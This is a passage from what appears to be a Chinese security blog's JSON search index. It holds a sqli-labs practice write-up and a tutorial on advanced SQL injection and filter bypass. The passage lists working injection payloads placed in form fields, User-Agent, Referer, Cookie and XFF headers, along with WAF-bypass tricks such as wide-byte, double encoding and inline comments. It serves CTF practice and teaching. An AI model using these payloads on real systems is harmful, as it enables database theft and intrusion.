2--+&amp;passwd=123&amp;submit=Submit\n\n没有任何回显，即字段数为2\nuname=-1&#x27; union select 1,2--+&amp;passwd=123&amp;submit=Submit\n\n即可在1或2位置插入查询语句\nuname=-1&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit\n\n\n②报错注入uname=-1&#x27;union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;passwd=123&amp;submit=Submit\n\n\n③布尔盲注uname=-1&#x27;union select 1,length(database())&gt;=1--+&amp;passwd=123&amp;submit=Submit\n\n\n④时间盲注uname=-1&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit\n\n\nLess-12相比于上一题，闭合方式发生了改变\nuname=-1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit\n\nLess-13啥回显都没有，选择时间盲注\n较为麻烦的在于判断闭合方式\nuname=-1&#x27;)union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit\n\nLess-14同上，闭合方式””\nuname=-1&quot; union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit\n\nLess-15同上，闭合方式’’\nuname=-1&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit\n\nLess-16同上，闭合方式(“”)\nuname=-1&quot;) union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit\n\nLess-17报错注入\n需提前知道用户名\nuname=admin&amp;passwd=-1&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;submit=Submit\n\nLess-18在User-Agent上输入注入语句\n且要保证用户名与密码是正确的\nuname=Dumb&amp;passwd=Dumb&amp;submit=Submit\n\nUser-Agent:&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and&#x27;\n\nLess-19注入点：Referer\nReferer: &#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)and&#x27;\n\n\n注意，这里在Referer注入时，需将原Referer的内容删除，笔者就是因为最开始没有删除，走了很多弯路\n\n错误注入：\n\n正确注入：\n\nLess-20附：找到一个Less-20，21，22讲得很细的博客\n注入点：Cookie\n与普通的联合注入方法相同\norder by 查询字段数\nunion联合查询即可\nCookie:-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#\n\n\n结果：\n\nLess-21任意用户登录后，发现Cookie值与上一题有所不同\n\n判断该值为base64加密\n将查询语句使用base64加密再进行注入\n闭合方式：(‘’)\nCookie:-1&#x27;)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#\n\nbase64编码后\nCookie:LTEnKXVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSM=\n\n\nLess-22同上\n闭合方式””\nCookie:-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#\n\nbase64编码后：\nCookie:LTEidW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw==\n\n","categories":["CTF-WEB"],"tags":["SQL","练习记录","sqli-labs"]},{"title":"SQL-SQL注入进阶与绕过技术","url":"/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/","content":"SQL-SQL注入进阶与绕过技术SQL注入进阶堆叠查询注入攻击堆叠查询可执行多条语句，多语句之间以句号分隔\nmysql_multi_query() 支持多条sql语句同时执行，即用’;’分隔多句SQL语句\n注入示例：题目环境[强网杯 2019]随便注\n由于该题限制了某些SQL语句\n\n故使用堆叠注入\n构造类似\n1&#x27;;show tables#\n\n\n堆叠注入可与大多数查询语句结合\n普通类型堆叠注入与时间输入结合的大致模板\n&#x27;;select if(substr(user(),1,1)=&#x27;a&#x27;,sleep(3),1)#\n\n二次注入攻击二次注入主要分为两部分：\n其一是恶意数据的插入\n第一次对数据库进行数据插入的时候，仅对其中特殊字符进行转义，在写入数据库的时候还是保留原来的数据，却是忽略了插入的数据本身包含恶意内容\n其二则是引用恶意数据\n数据存入数据库之后，被认为是可信的，而在下一次查询时，可在没有二次检验的情况下从数据库中取出恶意数据，造成数据库的二次注入\n宽字节注入攻击传入的引号被转义符（反斜线）转义，导致参数ID无法逃逸引号的包围\n\nPHP有addslashes()等函数，这类函数会自动过滤 ’ ‘’ null 等这些敏感字符，将它们转义成’ ‘’ \\null\n\n故一般情况下，不存在SQL注入漏洞\n然而，当数据库的编码为GBK时，可使用宽字节注入\n宽字节的格式是在地址后先加’%df’，再添加引号\n反斜杠的编码为”%5c”\n在GBK编码中，”%df%5c”为繁体字“連”，故可使引号成功逃逸\n基于pikachu漏洞练习平台的宽字节注入攻击示例\ncookie注入攻击URL中没有GET参数，但是页面返回正常，使用Burp Suite抓取数据包，发现cookie中存在id=1的参数\n修改id值判断cookie中的参数ID是否存在SQK注入\n若存在，即使用union注入方法即可\ncookie注入与其他注入方式不同的仅在与注入点不同罢了\nbase64注入攻击原理即为将所需传递的参数经过base64加密后再传输\nXFF注入攻击抓取数据包在HTTP请求头中有一头部参数”X-Forwarded-for”\n其简称为XFF头，代表客户端真实IP\n修改其值可伪造客户端IP\n将XFF值视为基本注入情况中的id值进行类似注入即可\n示例：\nX-Forwarded-for:127.0.0.1&#x27;union select 1,2,3#\n\nSQL绕过技术大小写绕过注入示例：\n访问id=1 and 1=1\n页面被拦截，即说明有关键词被过滤\n尝试修改关键词大小写方式绕过\n如：And 1=1 或：aNd 1=1 或：anD 等等（任意字母大小写皆可ANd,aND and so on）\n示例：\n使用order by查询字段数量\n页面被拦截\n尝试同上方法修改order的部分字母大小写\n可行的话即by没有被拦截\n若也被拦截，就继续绕过\n双写绕过注入从报错中的错误信息中发现，输入的and 1=1变成了1=1\n由此可得，关键词and被过滤\n尝试使用双写方式绕过\n示例：anandd 1=1 或：aandnd 1=1 and so on\n如若使用order by查询字段数量时，错误信息显示输入变成“der by”\n即可发现order整个单词没有被过滤，仅仅是or被过滤了\n此时只需要双写or即可\n编码绕过注入示例：\n访问id=1 and 1=1 或id=1 and 1=2 等等\n页面被拦截，即有关键词被拦截\n尝试使用url全编码的方式绕过\n\n 注意：url编码方式需选择全编码，而不是普通的url编码\n\n关键词and进行两次全编码结果：%25%36%31%25%36%65%25%36%34\n即访问：id=1 %25%36%31%25%36%65%25%36%34 1=1\n附：在网上难找到在线的url全编码工具，但是找到一个python脚本\nimport osdef main():    clearFlag = &quot;y&quot;    while(1):        if clearFlag == &quot;y&quot; or clearFlag == &quot;Y&quot;:            os.system(&quot;cls&quot;)        clearFlag = &quot;&quot;        string = input(&quot;请输入需要转换的字符串 :&quot;)        type = input(&quot;请选择操作类型(1：加密 2：解密) :&quot;)        while(type != &quot;1&quot; and type != &quot;2&quot;):            type = input(&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;)        if type == &quot;1&quot; :            encode_string = encode(string)            print(&quot;编码结果为：&quot;+encode_string+&quot;\\n&quot;)        if type == &quot;2&quot; :            decode_string = decode(string)            print(&quot;解码结果为：&quot;+decode_string+&quot;【请注意前后空格】\\n&quot;)        clearFlag = input(&quot;按Y/y清空屏幕继续:&quot;)#编码def encode(string):    encode_string = &quot;&quot;    for char in string:        encode_char = hex(ord(char)).replace(&quot;0x&quot;,&quot;%&quot;)        encode_string += encode_char    return encode_string#解码def decode(string):    decode_string = &quot;&quot;    string_arr = string.split(&quot;%&quot;)    string_arr.pop(0)           #删除第一个空元素    for char in string_arr:        decode_char = chr(eval(&quot;0x&quot;+char))        decode_string += decode_char    return decode_stringmain()\n\n内联注释绕过同样在关键词被绕过的情况下，可尝试使用内联注释绕过\n访问\nid=1 /*!and*/ 1=1\n\n","categories":["CTF-WEB"],"tags":["SQL","基础学习"]}]